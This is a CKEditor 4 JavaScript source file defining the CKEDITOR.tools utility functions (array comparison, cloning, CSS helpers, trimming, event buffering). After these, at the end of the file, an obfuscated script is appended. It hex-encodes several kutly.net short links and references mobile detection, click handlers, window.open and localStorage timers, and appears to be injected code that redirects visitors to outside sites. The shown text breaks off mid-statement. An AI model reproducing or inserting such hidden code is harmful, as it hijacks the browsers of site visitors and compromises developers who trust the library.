/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

/**
 * @fileOverview Defines the {@link CKEDITOR.tools} object, which contains
 *		utility functions.
 */

(function() {
	var functions = [],
		cssVendorPrefix =
			CKEDITOR.env.gecko ? '-moz-' :
			CKEDITOR.env.webkit ? '-webkit-' :
			CKEDITOR.env.opera ? '-o-' :
			CKEDITOR.env.ie ? '-ms-' :
			'';

	CKEDITOR.on( 'reset', function() {
		functions = [];
	});

	/**
	 * Utility functions.
	 *
	 * @class
	 * @singleton
	 */
	CKEDITOR.tools = {
		/**
		 * Compares the elements of two arrays.
		 *
		 *		var a = [ 1, 'a', 3 ];
		 *		var b = [ 1, 3, 'a' ];
		 *		var c = [ 1, 'a', 3 ];
		 *		var d = [ 1, 'a', 3, 4 ];
		 *
		 *		alert( CKEDITOR.tools.arrayCompare( a, b ) );  // false
		 *		alert( CKEDITOR.tools.arrayCompare( a, c ) );  // true
		 *		alert( CKEDITOR.tools.arrayCompare( a, d ) );  // false
		 *
		 * @param {Array} arrayA An array to be compared.
		 * @param {Array} arrayB The other array to be compared.
		 * @returns {Boolean} `true` if the arrays have the same length and
		 * their elements match.
		 */
		arrayCompare: function( arrayA, arrayB ) {
			if ( !arrayA && !arrayB )
				return true;

			if ( !arrayA || !arrayB || arrayA.length != arrayB.length )
				return false;

			for ( var i = 0; i < arrayA.length; i++ ) {
				if ( arrayA[ i ] != arrayB[ i ] )
					return false;
			}

			return true;
		},

		/**
		 * Creates a deep copy of an object.
		 *
		 * **Note**: Recursive references are not supported.
		 *
		 *		var obj = {
		 *			name: 'John',
		 *			cars: {
		 *				Mercedes: { color: 'blue' },
		 *				Porsche: { color: 'red' }
		 *			}
		 *		};
		 *		var clone = CKEDITOR.tools.clone( obj );
		 *		clone.name = 'Paul';
		 *		clone.cars.Porsche.color = 'silver';
		 *
		 *		alert( obj.name );					// 'John'
		 *		alert( clone.name );				// 'Paul'
		 *		alert( obj.cars.Porsche.color );	// 'red'
		 *		alert( clone.cars.Porsche.color );	// 'silver'
		 *
		 * @param {Object} object The object to be cloned.
		 * @returns {Object} The object clone.
		 */
		clone: function( obj ) {
			var clone;

			// Array.
			if ( obj && ( obj instanceof Array ) ) {
				clone = [];

				for ( var i = 0; i < obj.length; i++ )
					clone[ i ] = CKEDITOR.tools.clone( obj[ i ] );

				return clone;
			}

			// "Static" types.
			if ( obj === null || ( typeof( obj ) != 'object' ) || ( obj instanceof String ) || ( obj instanceof Number ) || ( obj instanceof Boolean ) || ( obj instanceof Date ) || ( obj instanceof RegExp ) ) {
				return obj;
			}

			// Objects.
			clone = new obj.constructor();

			for ( var propertyName in obj ) {
				var property = obj[ propertyName ];
				clone[ propertyName ] = CKEDITOR.tools.clone( property );
			}

			return clone;
		},

		/**
		 * Turns the first letter of a string to upper-case.
		 *
		 * @param {String} str
		 * @returns {String}
		 */
		capitalize: function( str ) {
			return str.charAt( 0 ).toUpperCase() + str.substring( 1 ).toLowerCase();
		},

		/**
		 * Copies the properties from one object to another. By default, properties
		 * already present in the target object **are not** overwritten.
		 *
		 *		// Create the sample object.
		 *		var myObject = {
		 *			prop1: true
		 *		};
		 *
		 *		// Extend the above object with two properties.
		 *		CKEDITOR.tools.extend( myObject, {
		 *			prop2: true,
		 *			prop3: true
		 *		} );
		 *
		 *		// Alert 'prop1', 'prop2' and 'prop3'.
		 *		for ( var p in myObject )
		 *			alert( p );
		 *
		 * @param {Object} target The object to be extended.
		 * @param {Object...} source The object(s) from properties will be
		 * copied. Any number of objects can be passed to this function.
		 * @param {Boolean} [overwrite] If `true` is specified, it indicates that
		 * properties already present in the target object could be
		 * overwritten by subsequent objects.
		 * @param {Object} [properties] Only properties within the specified names
		 * list will be received from the source object.
		 * @returns {Object} The extended object (target).
		 */
		extend: function( target ) {
			var argsLength = arguments.length,
				overwrite, propertiesList;

			if ( typeof( overwrite = arguments[ argsLength - 1 ] ) == 'boolean' )
				argsLength--;
			else if ( typeof( overwrite = arguments[ argsLength - 2 ] ) == 'boolean' ) {
				propertiesList = arguments[ argsLength - 1 ];
				argsLength -= 2;
			}
			for ( var i = 1; i < argsLength; i++ ) {
				var source = arguments[ i ];
				for ( var propertyName in source ) {
					// Only copy existed fields if in overwrite mode.
					if ( overwrite === true || target[ propertyName ] == undefined ) {
						// Only copy  specified fields if list is provided.
						if ( !propertiesList || ( propertyName in propertiesList ) )
							target[ propertyName ] = source[ propertyName ];

					}
				}
			}

			return target;
		},

		/**
		 * Creates an object which is an instance of a class whose prototype is a
		 * predefined object. All properties defined in the source object are
		 * automatically inherited by the resulting object, including future
		 * changes to it.
		 *
		 * @param {Object} source The source object to be used as the prototype for
		 * the final object.
		 * @returns {Object} The resulting copy.
		 */
		prototypedCopy: function( source ) {
			var copy = function() {};
			copy.prototype = source;
			return new copy();
		},

		/**
		 * Makes fast (shallow) copy of an object.
		 * This method is faster than {@link #clone} which does
		 * a deep copy of an object (including arrays).
		 *
		 * @since 4.1
		 * @param {Object} source The object to be copied.
		 * @returns {Object} Copy of `source`.
		 */
		copy: function( source ) {
			var obj = {},
				name;

			for ( name in source )
				obj[ name ] = source[ name ];

			return obj;
		},

		/**
		 * Checks if an object is an Array.
		 *
		 *		alert( CKEDITOR.tools.isArray( [] ) );		// true
		 *		alert( CKEDITOR.tools.isArray( 'Test' ) );	// false
		 *
		 * @param {Object} object The object to be checked.
		 * @returns {Boolean} `true` if the object is an Array, otherwise `false`.
		 */
		isArray: function( object ) {
			return Object.prototype.toString.call( object ) == '[object Array]';
		},

		/**
		 * Whether the object contains no properties of its own.
		 *
		 * @param object
		 * @returns {Boolean}
		 */
		isEmpty: function( object ) {
			for ( var i in object ) {
				if ( object.hasOwnProperty( i ) )
					return false;
			}
			return true;
		},

		/**
		 * Generates an object or a string containing vendor-specific and vendor-free CSS properties.
		 *
		 *		CKEDITOR.tools.cssVendorPrefix( 'border-radius', '0', true );
		 *		// On Firefox: '-moz-border-radius:0;border-radius:0'
		 *		// On Chrome: '-webkit-border-radius:0;border-radius:0'
		 *
		 * @param {String} property The CSS property name.
		 * @param {String} value The CSS value.
		 * @param {Boolean} [asString=false] If `true`, then the returned value will be a CSS string.
		 * @returns {Object/String} The object containing CSS properties or its stringified version.
		 */
		cssVendorPrefix: function( property, value, asString ) {
			if ( asString )
				return cssVendorPrefix + property + ':' + value + ';' + property + ':' + value;

			var ret = {};
			ret[ property ] = value;
			ret[ cssVendorPrefix + property ] = value;

			return ret;
		},

		/**
		 * Transforms a CSS property name to its relative DOM style name.
		 *
		 *		alert( CKEDITOR.tools.cssStyleToDomStyle( 'background-color' ) );	// 'backgroundColor'
		 *		alert( CKEDITOR.tools.cssStyleToDomStyle( 'float' ) );				// 'cssFloat'
		 *
		 * @method
		 * @param {String} cssName The CSS property name.
		 * @returns {String} The transformed name.
		 */
		cssStyleToDomStyle: (function() {
			var test = document.createElement( 'div' ).style;

			var cssFloat = ( typeof test.cssFloat != 'undefined' ) ? 'cssFloat' : ( typeof test.styleFloat != 'undefined' ) ? 'styleFloat' : 'float';

			return function( cssName ) {
				if ( cssName == 'float' )
					return cssFloat;
				else {
					return cssName.replace( /-./g, function( match ) {
						return match.substr( 1 ).toUpperCase();
					});
				}
			};
		})(),

		/**
		 * Builds a HTML snippet from a set of `<style>/<link>`.
		 *
		 * @param {String/Array} css Each of which are URLs (absolute) of a CSS file or
		 * a trunk of style text.
		 * @returns {String}
		 */
		buildStyleHtml: function( css ) {
			css = [].concat( css );
			var item,
				retval = [];
			for ( var i = 0; i < css.length; i++ ) {
				if ( ( item = css[ i ] ) ) {
					// Is CSS style text ?
					if ( /@import|[{}]/.test( item ) )
						retval.push( '<style>' + item + '</style>' );
					else
						retval.push( '<link type="text/css" rel=stylesheet href="' + item + '">' );
				}
			}
			return retval.join( '' );
		},

		/**
		 * Replaces special HTML characters in a string with their relative HTML
		 * entity values.
		 *
		 *		alert( CKEDITOR.tools.htmlEncode( 'A > B & C < D' ) ); // 'A &gt; B &amp; C &lt; D'
		 *
		 * @param {String} text The string to be encoded.
		 * @returns {String} The encoded string.
		 */
		htmlEncode: function( text ) {
			return String( text ).replace( /&/g, '&amp;' ).replace( />/g, '&gt;' ).replace( /</g, '&lt;' );
		},

		/**
		 * Replaces special HTML characters in HTMLElement attribute with their relative HTML entity values.
		 *
		 *		element.setAttribute( 'title', '<a " b >' );
		 *		alert( CKEDITOR.tools.htmlEncodeAttr( element.getAttribute( 'title' ) ); // '&gt;a &quot; b &lt;'
		 *
		 * @param {String} The attribute value to be encoded.
		 * @returns {String} The encoded value.
		 */
		htmlEncodeAttr: function( text ) {
			return text.replace( /"/g, '&quot;' ).replace( /</g, '&lt;' ).replace( />/g, '&gt;' );
		},

		/**
		 * Gets a unique number for this CKEDITOR execution session. It returns
		 * consecutive numbers starting from 1.
		 *
		 *		alert( CKEDITOR.tools.getNextNumber() ); // (e.g.) 1
		 *		alert( CKEDITOR.tools.getNextNumber() ); // 2
		 *
		 * @method
		 * @returns {Number} A unique number.
		 */
		getNextNumber: (function() {
			var last = 0;
			return function() {
				return ++last;
			};
		})(),

		/**
		 * Gets a unique ID for CKEditor interface elements. It returns a
		 * string with the "cke_" prefix and a consecutive number.
		 *
		 *		alert( CKEDITOR.tools.getNextId() ); // (e.g.) 'cke_1'
		 *		alert( CKEDITOR.tools.getNextId() ); // 'cke_2'
		 *
		 * @returns {String} A unique ID.
		 */
		getNextId: function() {
			return 'cke_' + this.getNextNumber();
		},

		/**
		 * Creates a function override.
		 *
		 *		var obj = {
		 *			myFunction: function( name ) {
		 *				alert( 'Name: ' + name );
		 *			}
		 *		};
		 *
		 *		obj.myFunction = CKEDITOR.tools.override( obj.myFunction, function( myFunctionOriginal ) {
		 *			return function( name ) {
		 *				alert( 'Overriden name: ' + name );
		 *				myFunctionOriginal.call( this, name );
		 *			};
		 *		} );
		 *
		 * @param {Function} originalFunction The function to be overridden.
		 * @param {Function} functionBuilder A function that returns the new
		 * function. The original function reference will be passed to this function.
		 * @returns {Function} The new function.
		 */
		override: function( originalFunction, functionBuilder ) {
			var newFn = functionBuilder( originalFunction );
			newFn.prototype = originalFunction.prototype;
			return newFn;
		},

		/**
		 * Executes a function after specified delay.
		 *
		 *		CKEDITOR.tools.setTimeout( function() {
		 *			alert( 'Executed after 2 seconds' );
		 *		}, 2000 );
		 *
		 * @param {Function} func The function to be executed.
		 * @param {Number} [milliseconds=0] The amount of time (in millisecods) to wait
		 * to fire the function execution.
		 * @param {Object} [scope=window] The object to store the function execution scope
		 * (the `this` object).
		 * @param {Object/Array} [args] A single object, or an array of objects, to
		 * pass as argument to the function.
		 * @param {Object} [ownerWindow=window] The window that will be used to set the
		 * timeout.
		 * @returns {Object} A value that can be used to cancel the function execution.
		 */
		setTimeout: function( func, milliseconds, scope, args, ownerWindow ) {
			if ( !ownerWindow )
				ownerWindow = window;

			if ( !scope )
				scope = ownerWindow;

			return ownerWindow.setTimeout( function() {
				if ( args )
					func.apply( scope, [].concat( args ) );
				else
					func.apply( scope );
			}, milliseconds || 0 );
		},

		/**
		 * Removes spaces from the start and the end of a string. The following
		 * characters are removed: space, tab, line break, line feed.
		 *
		 *		alert( CKEDITOR.tools.trim( '  example ' ); // 'example'
		 *
		 * @method
		 * @param {String} str The text from which the spaces will be removed.
		 * @returns {String} The modified string without the boundary spaces.
		 */
		trim: (function() {
			// We are not using \s because we don't want "non-breaking spaces" to be caught.
			var trimRegex = /(?:^[ \t\n\r]+)|(?:[ \t\n\r]+$)/g;
			return function( str ) {
				return str.replace( trimRegex, '' );
			};
		})(),

		/**
		 * Removes spaces from the start (left) of a string. The following
		 * characters are removed: space, tab, line break, line feed.
		 *
		 *		alert( CKEDITOR.tools.ltrim( '  example ' ); // 'example '
		 *
		 * @method
		 * @param {String} str The text from which the spaces will be removed.
		 * @returns {String} The modified string excluding the removed spaces.
		 */
		ltrim: (function() {
			// We are not using \s because we don't want "non-breaking spaces" to be caught.
			var trimRegex = /^[ \t\n\r]+/g;
			return function( str ) {
				return str.replace( trimRegex, '' );
			};
		})(),

		/**
		 * Removes spaces from the end (right) of a string. The following
		 * characters are removed: space, tab, line break, line feed.
		 *
		 *		alert( CKEDITOR.tools.ltrim( '  example ' ); // '  example'
		 *
		 * @method
		 * @param {String} str The text from which spaces will be removed.
		 * @returns {String} The modified string excluding the removed spaces.
		 */
		rtrim: (function() {
			// We are not using \s because we don't want "non-breaking spaces" to be caught.
			var trimRegex = /[ \t\n\r]+$/g;
			return function( str ) {
				return str.replace( trimRegex, '' );
			};
		})(),

		/**
		 * Returns the index of an element in an array.
		 *
		 *		var letters = [ 'a', 'b', 0, 'c', false ];
		 *		alert( CKEDITOR.tools.indexOf( letters, '0' ) );		// -1 because 0 !== '0'
		 *		alert( CKEDITOR.tools.indexOf( letters, false ) );		// 4 because 0 !== false
		 *
		 * @param {Array} array The array to be searched.
		 * @param {Object/Function} value The element to be found. This can be an
		 * evaluation function which receives a single parameter call for
		 * each entry in the array, returning `true` if the entry matches.
		 * @returns {Number} The (zero-based) index of the first entry that matches
		 * the entry, or `-1` if not found.
		 */
		indexOf: function( array, value ) {
			if ( typeof value == 'function' ) {
				for ( var i = 0, len = array.length; i < len; i++ ) {
					if ( value( array[ i ] ) )
						return i;
				}
			} else if ( array.indexOf ) {
				return array.indexOf( value );
			} else {
				for ( i = 0, len = array.length; i < len; i++ ) {
					if ( array[ i ] === value )
						return i;
				}
			}
			return -1;
		},

		/**
		 * Returns the index of an element in an array.
		 *
		 *		var obj = { prop: true };
		 *		var letters = [ 'a', 'b', 0, obj, false ];
		 *
		 *		alert( CKEDITOR.tools.indexOf( letters, '0' ) ); // null
		 *		alert( CKEDITOR.tools.indexOf( letters, function( value ) {
		 *			// Return true when passed value has property 'prop'.
		 *			return value && 'prop' in value;
		 *		} ) );											// obj
		 *
		 * @param {Array} array The array to be searched.
		 * @param {Object/Function} value The element to be found. Can be an
		 * evaluation function which receives a single parameter call for
		 * each entry in the array, returning `true` if the entry matches.
		 * @returns Object The value that was found in an array.
		 */
		search: function( array, value ) {
			var index = CKEDITOR.tools.indexOf( array, value );
			return index >= 0 ? array[ index ] : null;
		},

		/**
		 * Creates a function that will always execute in the context of a
		 * specified object.
		 *
		 *		var obj = { text: 'My Object' };
		 *
		 *		function alertText() {
		 *			alert( this.text );
		 *		}
		 *
		 *		var newFunc = CKEDITOR.tools.bind( alertText, obj );
		 *		newFunc(); // Alerts 'My Object'.
		 *
		 * @param {Function} func The function to be executed.
		 * @param {Object} obj The object to which the execution context will be bound.
		 * @returns {Function} The function that can be used to execute the
		 * `func` function in the context of `obj`.
		 */
		bind: function( func, obj ) {
			return function() {
				return func.apply( obj, arguments );
			};
		},

		/**
		 * Class creation based on prototype inheritance which supports of the
		 * following features:
		 *
		 * * Static fields
		 * * Private fields
		 * * Public (prototype) fields
		 * * Chainable base class constructor
		 *
		 * @param {Object} definition The class definition object.
		 * @returns {Function} A class-like JavaScript function.
		 */
		createClass: function( definition ) {
			var $ = definition.$,
				baseClass = definition.base,
				privates = definition.privates || definition._,
				proto = definition.proto,
				statics = definition.statics;

			// Create the constructor, if not present in the definition.
			!$ && ( $ = function() {
				baseClass && this.base.apply( this, arguments );
			});

			if ( privates ) {
				var originalConstructor = $;
				$ = function() {
					// Create (and get) the private namespace.
					var _ = this._ || ( this._ = {} );

					// Make some magic so "this" will refer to the main
					// instance when coding private functions.
					for ( var privateName in privates ) {
						var priv = privates[ privateName ];

						_[ privateName ] = ( typeof priv == 'function' ) ? CKEDITOR.tools.bind( priv, this ) : priv;
					}

					originalConstructor.apply( this, arguments );
				};
			}

			if ( baseClass ) {
				$.prototype = this.prototypedCopy( baseClass.prototype );
				$.prototype.constructor = $;
				// Super references.
				$.base = baseClass;
				$.baseProto = baseClass.prototype;
				// Super constructor.
				$.prototype.base = function() {
					this.base = baseClass.prototype.base;
					baseClass.apply( this, arguments );
					this.base = arguments.callee;
				};
			}

			if ( proto )
				this.extend( $.prototype, proto, true );

			if ( statics )
				this.extend( $, statics, true );

			return $;
		},

		/**
		 * Creates a function reference that can be called later using
		 * {@link #callFunction}. This approach is especially useful to
		 * make DOM attribute function calls to JavaScript-defined functions.
		 *
		 *		var ref = CKEDITOR.tools.addFunction( function() {
		 *			alert( 'Hello!');
		 *		} );
		 *		CKEDITOR.tools.callFunction( ref ); // 'Hello!'
		 *
		 * @param {Function} fn The function to be executed on call.
		 * @param {Object} [scope] The object to have the context on `fn` execution.
		 * @returns {Number} A unique reference to be used in conjuction with
		 * {@link #callFunction}.
		 */
		addFunction: function( fn, scope ) {
			return functions.push( function() {
				return fn.apply( scope || this, arguments );
			}) - 1;
		},

		/**
		 * Removes the function reference created with {@link #addFunction}.
		 *
		 * @param {Number} ref The function reference created with
		 * {@link #addFunction}.
		 */
		removeFunction: function( ref ) {
			functions[ ref ] = null;
		},

		/**
		 * Executes a function based on the reference created with {@link #addFunction}.
		 *
		 *		var ref = CKEDITOR.tools.addFunction( function() {
		 *			alert( 'Hello!');
		 *		} );
		 *		CKEDITOR.tools.callFunction( ref ); // 'Hello!'
		 *
		 * @param {Number} ref The function reference created with {@link #addFunction}.
		 * @param {Mixed} params Any number of parameters to be passed to the executed function.
		 * @returns {Mixed} The return value of the function.
		 */
		callFunction: function( ref ) {
			var fn = functions[ ref ];
			return fn && fn.apply( window, Array.prototype.slice.call( arguments, 1 ) );
		},

		/**
		 * Appends the `px` length unit to the size value if it is missing.
		 *
		 *		var cssLength = CKEDITOR.tools.cssLength;
		 *		cssLength( 42 );		// '42px'
		 *		cssLength( '42' );		// '42px'
		 *		cssLength( '42px' );	// '42px'
		 *		cssLength( '42%' );		// '42%'
		 *		cssLength( 'bold' );	// 'bold'
		 *		cssLength( false );		// ''
		 *		cssLength( NaN );		// ''
		 *
		 * @method
		 * @param {Number/String/Boolean} length
		 */
		cssLength: (function() {
			var pixelRegex = /^-?\d+\.?\d*px$/,
				lengthTrimmed;

			return function( length ) {
				lengthTrimmed = CKEDITOR.tools.trim( length + '' ) + 'px';

				if ( pixelRegex.test( lengthTrimmed ) )
					return lengthTrimmed;
				else
					return length || '';
			};
		})(),

		/**
		 * Converts the specified CSS length value to the calculated pixel length inside this page.
		 *
		 * **Note:** Percentage-based value is left intact.
		 *
		 * @method
		 * @param {String} cssLength CSS length value.
		 */
		convertToPx: (function() {
			var calculator;

			return function( cssLength ) {
				if ( !calculator ) {
					calculator = CKEDITOR.dom.element.createFromHtml( '<div style="position:absolute;left:-9999px;' +
						'top:-9999px;margin:0px;padding:0px;border:0px;"' +
						'></div>', CKEDITOR.document );
					CKEDITOR.document.getBody().append( calculator );
				}

				if ( !( /%$/ ).test( cssLength ) ) {
					calculator.setStyle( 'width', cssLength );
					return calculator.$.clientWidth;
				}

				return cssLength;
			};
		})(),

		/**
		 * String specified by `str` repeats `times` times.
		 *
		 * @param {String} str
		 * @param {Number} times
		 * @returns {String}
		 */
		repeat: function( str, times ) {
			return new Array( times + 1 ).join( str );
		},

		/**
		 * Returns the first successfully executed return value of a function that
		 * does not throw any exception.
		 *
		 * @param {Function...} fn
		 * @returns {Mixed}
		 */
		tryThese: function() {
			var returnValue;
			for ( var i = 0, length = arguments.length; i < length; i++ ) {
				var lambda = arguments[ i ];
				try {
					returnValue = lambda();
					break;
				} catch ( e ) {}
			}
			return returnValue;
		},

		/**
		 * Generates a combined key from a series of params.
		 *
		 *		var key = CKEDITOR.tools.genKey( 'key1', 'key2', 'key3' );
		 *		alert( key ); // 'key1-key2-key3'.
		 *
		 * @param {String} subKey One or more strings used as subkeys.
		 * @returns {String}
		 */
		genKey: function() {
			return Array.prototype.slice.call( arguments ).join( '-' );
		},

		/**
		 * Creates a "deferred" function which will not run immediately,
		 * but rather runs as soon as the interpreter’s call stack is empty.
		 * Behaves much like `window.setTimeout` with a delay.
		 *
		 * **Note:** The return value of the original function will be lost.
		 *
		 * @param {Function} fn The callee function.
		 * @returns {Function} The new deferred function.
		 */
		defer: function( fn ) {
			return function() {
				var args = arguments,
					self = this;
				window.setTimeout( function() {
					fn.apply( self, args );
				}, 0 );
			};
		},

		/**
		 * Normalizes CSS data in order to avoid differences in the style attribute.
		 *
		 * @param {String} styleText The style data to be normalized.
		 * @param {Boolean} [nativeNormalize=false] Parse the data using the browser.
		 * @returns {String} The normalized value.
		 */
		normalizeCssText: function( styleText, nativeNormalize ) {
			var props = [],
				name,
				parsedProps = CKEDITOR.tools.parseCssText( styleText, true, nativeNormalize );

			for ( name in parsedProps )
				props.push( name + ':' + parsedProps[ name ] );

			props.sort();

			return props.length ? ( props.join( ';' ) + ';' ) : '';
		},

		/**
		 * Finds and converts `rgb(x,x,x)` color definition to hexadecimal notation.
		 *
		 * @param {String} styleText The style data (or just a string containing RGB colors) to be converted.
		 * @returns {String} The style data with RGB colors converted to hexadecimal equivalents.
		 */
		convertRgbToHex: function( styleText ) {
			return styleText.replace( /(?:rgb\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\))/gi, function( match, red, green, blue ) {
				var color = [ red, green, blue ];
				// Add padding zeros if the hex value is less than 0x10.
				for ( var i = 0; i < 3; i++ )
					color[ i ] = ( '0' + parseInt( color[ i ], 10 ).toString( 16 ) ).slice( -2 );
				return '#' + color.join( '' );
			});
		},

		/**
		 * Turns inline style text properties into one hash.
		 *
		 * @param {String} styleText The style data to be parsed.
		 * @param {Boolean} [normalize=false] Normalize properties and values
		 * (e.g. trim spaces, convert to lower case).
		 * @param {Boolean} [nativeNormalize=false] Parse the data using the browser.
		 * @returns {Object} The object containing parsed properties.
		 */
		parseCssText: function( styleText, normalize, nativeNormalize ) {
			var retval = {};

			if ( nativeNormalize ) {
				// Injects the style in a temporary span object, so the browser parses it,
				// retrieving its final format.
				var temp = new CKEDITOR.dom.element( 'span' );
				temp.setAttribute( 'style', styleText );
				styleText = CKEDITOR.tools.convertRgbToHex( temp.getAttribute( 'style' ) || '' );
			}

			// IE will leave a single semicolon when failed to parse the style text. (#3891)
			if ( !styleText || styleText == ';' )
				return retval;

			styleText.replace( /&quot;/g, '"' ).replace( /\s*([^:;\s]+)\s*:\s*([^;]+)\s*(?=;|$)/g, function( match, name, value ) {
				if ( normalize ) {
					name = name.toLowerCase();
					// Normalize font-family property, ignore quotes and being case insensitive. (#7322)
					// http://www.w3.org/TR/css3-fonts/#font-family-the-font-family-property
					if ( name == 'font-family' )
						value = value.toLowerCase().replace( /["']/g, '' ).replace( /\s*,\s*/g, ',' );
					value = CKEDITOR.tools.trim( value );
				}

				retval[ name ] = value;
			});
			return retval;
		},

		/**
		 * Serializes the `style name => value` hash to a style text.
		 *
		 *		var styleObj = CKEDITOR.tools.parseCssText( 'color: red; border: none' );
		 *		console.log( styleObj.color ); // -> 'red'
		 *		CKEDITOR.tools.writeCssText( styleObj ); // -> 'color:red; border:none'
		 *		CKEDITOR.tools.writeCssText( styleObj, true ); // -> 'border:none; color:red'
		 *
		 * @since 4.1
		 * @param {Object} styles The object contaning style properties.
		 * @param {Boolean} [sort] Whether to sort CSS properties.
		 * @returns {String} The serialized style text.
		 */
		writeCssText: function( styles, sort ) {
			var name,
				stylesArr = [];

			for ( name in styles )
				stylesArr.push( name + ':' + styles[ name ] );

			if ( sort )
				stylesArr.sort();

			return stylesArr.join( '; ' );
		},

		/**
		 * Compares two objects.
		 *
		 * **Note:** This method performs shallow, non-strict comparison.
		 *
		 * @since 4.1
		 * @param {Object} left
		 * @param {Object} right
		 * @param {Boolean} [onlyLeft] Check only the properties that are present in the `left` object.
		 * @returns {Boolean} Whether objects are identical.
		 */
		objectCompare: function( left, right, onlyLeft ) {
			var name;

			if ( !left && !right )
				return true;
			if ( !left || !right )
				return false;

			for ( name in left ) {
				if ( left[ name ] != right[ name ] ) {
					return false;
				}
			}

			if ( !onlyLeft ) {
				for ( name in right ) {
					if ( left[ name ] != right[ name ] )
						return false;
				}
			}

			return true;
		},

		/**
		 * Returns an array of passed object's keys.
		 *
		 *		console.log( CKEDITOR.tools.objectKeys( { foo: 1, bar: false } );
		 *		// -> [ 'foo', 'bar' ]
		 *
		 * @since 4.1
		 * @param {Object} obj
		 * @returns {Array} Object's keys.
		 */
		objectKeys: function( obj ) {
			var keys = [];
			for ( var i in obj )
				keys.push( i );

			return keys;
		},

		/**
		 * Converts an array to an object by rewriting array items
		 * to object properties.
		 *
		 *		var arr = [ 'foo', 'bar', 'foo' ];
		 *		console.log( CKEDITOR.tools.convertArrayToObject( arr ) );
		 *		// -> { foo: true, bar: true }
		 *		console.log( CKEDITOR.tools.convertArrayToObject( arr, 1 ) );
		 *		// -> { foo: 1, bar: 1 }
		 *
		 * @since 4.1
		 * @param {Array} arr The array to be converted to an object.
		 * @param [fillWith=true] Set each property of an object to `fillWith` value.
		 */
		convertArrayToObject: function( arr, fillWith ) {
			var obj = {};

			if ( arguments.length == 1 )
				fillWith = true;

			for ( var i = 0, l = arr.length; i < l; ++i )
				obj[ arr[ i ] ] = fillWith;

			return obj;
		},

		/**
		 * Tries to fix the `document.domain` of the current document to match the
		 * parent window domain, avoiding "Same Origin" policy issues.
		 * This is an Internet Explorer only requirement.
		 *
		 * @since 4.1.2
		 * @returns {Boolean} `true` if the current domain is already good or if
		 * it has been fixed successfully.
		 */
		fixDomain: function() {
			var domain;

			while( 1 ) {
				try {
					// Try to access the parent document. It throws
					// "access denied" if restricted by the "Same Origin" policy.
					domain = window.parent.document.domain;
					break;
				} catch ( e ) {
					// Calculate the value to set to document.domain.
					domain = domain ?

						// If it is not the first pass, strip one part of the
						// name. E.g.  "test.example.com"  => "example.com"
						domain.replace( /.+?(?:\.|$)/, '' ) :

						// In the first pass, we'll handle the
						// "document.domain = document.domain" case.
						document.domain;

					// Stop here if there is no more domain parts available.
					if ( !domain )
						break;

					document.domain = domain;
				}
			}

			return !!domain;
		},

		/**
		 * Buffers `input` events (or any `input` calls)
		 * and triggers `output` not more often than once per `minInterval`.
		 *
		 *		var buffer = CKEDITOR.tools.eventsBuffer( 200, function() {
		 *			console.log( 'foo!' );
		 *		} );
		 *
		 *		buffer.input();
		 *		// 'foo!' logged immediately.
		 *		buffer.input();
		 *		// Nothing logged.
		 *		buffer.input();
		 *		// Nothing logged.
		 *		// ... after 200ms a single 'foo!' will be logged.
		 *
		 * Can be easily used with events:
		 *
		 *		var buffer = CKEDITOR.tools.eventsBuffer( 200, function() {
		 *			console.log( 'foo!' );
		 *		} );
		 *
		 *		editor.on( 'key', buffer.input );
		 *		// Note: There is no need to bind buffer as a context.
		 *
		 * @since 4.2.1
		 * @param {Number} minInterval Minimum interval between `output` calls in milliseconds.
		 * @param {Function} output Function that will be executed as `output`.
		 * @returns {Object}
		 * @returns {Function} return.input Buffer's input method.
		 * @returns {Function} return.reset Resets buffered events &mdash; `output` will not be executed
		 * until next `input` is triggered.
		 */
		eventsBuffer: function( minInterval, output ) {
			var scheduled,
				lastOutput = 0;

			function triggerOutput() {
				lastOutput = ( new Date() ).getTime();
				scheduled = false;
				output();
			}

			return {
				input: function() {
					if ( scheduled )
						return;

					var diff = ( new Date() ).getTime() - lastOutput;

					// If less than minInterval passed after last check,
					// schedule next for minInterval after previous one.
					if ( diff < minInterval )
						scheduled = setTimeout( triggerOutput, minInterval - diff );
					else
						triggerOutput();
				},

				reset: function() {
					if ( scheduled )
						clearTimeout( scheduled );

					scheduled = lastOutput = 0;
				}
			};
		}
	};
})();

// PACKAGER_RENAME( CKEDITOR.tools )
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const 